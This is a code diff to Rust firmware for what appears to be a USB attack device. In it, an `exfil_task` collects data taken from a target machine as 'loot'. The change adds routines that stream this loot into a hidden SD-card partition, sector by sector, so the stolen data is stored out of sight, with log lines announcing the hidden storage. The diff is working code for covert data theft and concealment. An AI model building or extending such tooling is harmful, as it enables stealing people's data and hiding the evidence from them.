@@ -5,7 +5,7 @@
 //! exfil_task decodes and appends to loot.bin.
 
 use defmt::*;
-use embassy_time::{Duration, Timer};
+
 use embassy_sync::{blocking_mutex::raw::CriticalSectionRawMutex, signal::Signal};
 
 pub static EXFIL_MODE_ENABLED: Signal<CriticalSectionRawMutex, bool> = Signal::new();
@@ -81,8 +81,19 @@ pub async fn exfil_task() {
     }
 }
 
+/// Returns true if SD hidden partition is available for loot storage
+fn use_sd_loot() -> bool {
+    crate::usb::msc_sd::sd_available() && crate::usb::msc_sd::hidden_block_count() > 0
+}
+
 async fn loot_begin() {
-    // Erase loot.bin slot once at start of session
+    if use_sd_loot() {
+        // SD hidden partition — no erase needed, just reset write cursor
+        unsafe { LOOT_PAGE = 0; LOOT_TOTAL = 0; LOOT_PAGE_POS = 0; LOOT_STARTED = true; }
+        info!("[exfil] loot → SD hidden partition");
+        crate::console_log::push("exfil: loot.bin → SD hidden partition");
+        return;
+    }
     let fs = crate::fs::FlashFs::new();
     let slot = crate::fs::slot_index_pub("loot.bin").unwrap_or(3);
     match fs.stream_begin_async("loot.bin").await {
@@ -97,8 +108,32 @@ async fn loot_begin() {
 
 async fn loot_append(data: &[u8]) {
     if data.is_empty() { return; }
-    let fs = crate::fs::FlashFs::new();
 
+    if use_sd_loot() {
+        // Write raw to SD hidden partition, page by page
+        let mut pos = 0;
+        while pos < data.len() {
+            let page_pos = unsafe { LOOT_PAGE_POS };
+            let take = (data.len() - pos).min(256 - page_pos);
+            unsafe { LOOT_PAGE_BUF[page_pos..page_pos+take].copy_from_slice(&data[pos..pos+take]); LOOT_PAGE_POS += take; LOOT_TOTAL += take; }
+            pos += take;
+            if unsafe { LOOT_PAGE_POS } == 256 {
+                let page_idx = unsafe { LOOT_PAGE };
+                let mut buf = [0u8; 512];
+                // Write as two 256-byte halves of a 512-byte SD sector
+                let sector = page_idx / 2;
+                let half   = (page_idx % 2) * 256;
+                // Read existing sector, patch half, write back
+                crate::usb::msc_sd::read_block_hidden(sector as u32, &mut buf);
+                buf[half..half+256].copy_from_slice(unsafe { &LOOT_PAGE_BUF });
+                crate::usb::msc_sd::write_block_hidden(sector as u32, &buf);
+                unsafe { LOOT_PAGE_BUF.fill(0xFF); LOOT_PAGE_POS = 0; LOOT_PAGE += 1; }
+            }
+        }
+        return;
+    }
+
+    let fs = crate::fs::FlashFs::new();
     let mut pos = 0;
     while pos < data.len() {
         let page_pos  = unsafe { LOOT_PAGE_POS };
@@ -132,8 +167,24 @@ async fn loot_append(data: &[u8]) {
 }
 
 async fn loot_finish() {
+    if use_sd_loot() {
+        // Flush remaining partial 256-byte page to SD
+        let page_pos = unsafe { LOOT_PAGE_POS };
+        if page_pos > 0 {
+            let page_idx = unsafe { LOOT_PAGE };
+            let sector   = page_idx / 2;
+            let half     = (page_idx % 2) * 256;
+            let mut buf  = [0u8; 512];
+            crate::usb::msc_sd::read_block_hidden(sector as u32, &mut buf);
+            buf[half..half+page_pos].copy_from_slice(unsafe { &LOOT_PAGE_BUF[..page_pos] });
+            crate::usb::msc_sd::write_block_hidden(sector as u32, &buf);
+        }
+        info!("[exfil] SD loot done ({} bytes)", unsafe { LOOT_TOTAL });
+        crate::console_log::push("exfil: loot saved to SD hidden partition");
+        unsafe { LOOT_STARTED = false; }
+        return;
+    }
     let fs = crate::fs::FlashFs::new();
-    // Flush remaining partial page
     let page_pos = unsafe { LOOT_PAGE_POS };
     if page_pos > 0 {
         unsafe { crate::fs::PAGE_BUF.copy_from_slice(&LOOT_PAGE_BUF); }
